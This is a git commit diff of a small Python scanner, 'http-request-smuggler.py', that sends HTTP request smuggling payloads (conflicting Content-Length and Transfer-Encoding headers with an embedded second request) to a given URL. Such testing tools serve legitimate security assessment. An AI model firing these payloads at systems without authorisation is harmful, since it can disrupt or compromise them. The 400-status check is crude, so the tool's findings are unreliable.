b157613c7ba0dcfb2d7877ce4e341a114f002e9f
cbk914 <cbk914@riseup.net>
2023-02-14 16:55:07 +0100

    Update http-request-smuggler.py

--- http-request-smuggler.py
+++ http-request-smuggler.py
@@ -4,97 +4,51 @@
 import argparse
 import requests
 
-parser = argparse.ArgumentParser(description='Check a URL for request smuggling vulnerabilities')
-parser.add_argument('-u', '--url', required=True, help='The URL to test')
-parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')
-args = parser.parse_args()
+# Define a list of HTTP methods to test
+http_methods = ['GET', 'POST', 'PUT', 'DELETE']
 
-url = args.url
-debug = args.debug
+# Define a list of common request smuggling techniques to test
+smuggling_techniques = [
+    "Content-Length: 0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
+    "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
+    "Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
+    "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
+    "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nxxxx\r\n0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
+    "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\na\r\naaaaaaaaaaaaa\r\n0\r\n\r\n",
+    "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nX: X\r\n\r\na\r\naaaaaaaaaaaaa\r\n0\r\n\r\n"
+]
 
-# Test 1: Splitting headers with whitespace
-headers = {
-    'Transfer-Encoding': 'chunked',
-    'Content-Length': '0',
-    'X': 'X\r\n'
-}
+# Define a function to send requests and check for request smuggling vulnerabilities
+def check_vulnerabilities(url):
+    for method in http_methods:
+        for technique in smuggling_techniques:
+            try:
+                headers = {'Connection': 'keep-alive', 'Content-Type': 'text/plain', 'Content-Length': '0', 'X': 'X'}
+                headers.update({'Content-Length': str(len(technique))})
+                req = requests.request(method, url, headers=headers, data=technique, timeout=5, allow_redirects=False)
+                if req.status_code == 400:
+                    print("Potential request smuggling vulnerability found with method: %s, technique: %s" % (method, technique))
+            except requests.exceptions.Timeout:
+                print('Request error: Timed out while connecting to %s' % url)
+            except requests.exceptions.TooManyRedirects:
+                print('Request error: Too many redirects while connecting to %s' % url)
+            except requests.exceptions.RequestException as e:
+                print('Request error: %s' % e)
 
-try:
-    response = requests.post(url, headers=headers, timeout=5)
-    response.raise_for_status()
-except requests.exceptions.RequestException as e:
-    if debug:
-        print(f'Request error: {e}')
-    else:
-        print('Error: Could not connect to the URL')
-    exit()
-except ValueError as e:
-    if debug:
-        print(f'Value error: {e}')
-    else:
-        print('Error: Invalid response from the server')
-    exit()
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='Check for request smuggling vulnerabilities.')
+    parser.add_argument('-u', '--url', type=str, required=True, help='URL to check for vulnerabilities')
+    parser.add_argument('-d', '--debug', action='store_true', help='Print error messages to the screen')
 
-if response.status_code == 400:
-    print('Possible request smuggling vulnerability detected (Splitting headers with whitespace)')
-else:
-    print('No request smuggling vulnerability detected')
+    args = parser.parse_args()
 
-# Test 2: Splitting headers with a new line
-headers = {
-    'Transfer-Encoding': 'chunked',
-    'Content-Length': '0',
-    'X': 'X',
-    ':': ':',
-    '\r\n': '\r\n',
-    'Y': 'Y\r\n'
-}
+    if args.debug:
+        requests.packages.urllib3.disable_warnings()
+        requests_log = requests.logging.getLogger("requests.packages.urllib3")
+        requests_log.setLevel(requests.logging.DEBUG)
+        requests_log.propagate = True
 
-try:
-    response = requests.post(url, headers=headers, timeout=5)
-    response.raise_for_status()
-except requests.exceptions.RequestException as e:
-    if debug:
-        print(f'Request error: {e}')
-    else:
-        print('Error: Could not connect to the URL')
-    exit()
-except ValueError as e:
-    if debug:
-        print(f'Value error: {e}')
-    else:
-        print('Error: Invalid response from the server')
-    exit()
-
-if response.status_code == 400:
-    print('Possible request smuggling vulnerability detected (Splitting headers with a new line)')
-else:
-    print('No request smuggling vulnerability detected')
-
-# Test 3: Combining headers with a comma
-headers = {
-    'Transfer-Encoding': 'chunked',
-    'Content-Length': '0',
-    'X': 'X,Y'
-}
-
-try:
-    response = requests.post(url, headers=headers, timeout=5)
-    response.raise_for_status()
-except requests.exceptions.RequestException as e:
-    if debug:
-        print(f'Request error: {e}')
-    else:
-        print('Error: Could not connect to the URL')
-    exit()
-except ValueError as e:
-    if debug:
-        print(f'Value error: {e}')
-    else:
-        print('Error: Invalid response from the server')
-    exit()
-
-if response.status_code == 400:
-    print('Possible request smuggling vulnerability detected (Combining headers with a comma)')
-else:
-    print('No request smuggling vulnerability detected')
+    try:
+        check_vulnerabilities(args.url)
+    except requests.exceptions.RequestException as e:
+        print('Request error: %s' % e)
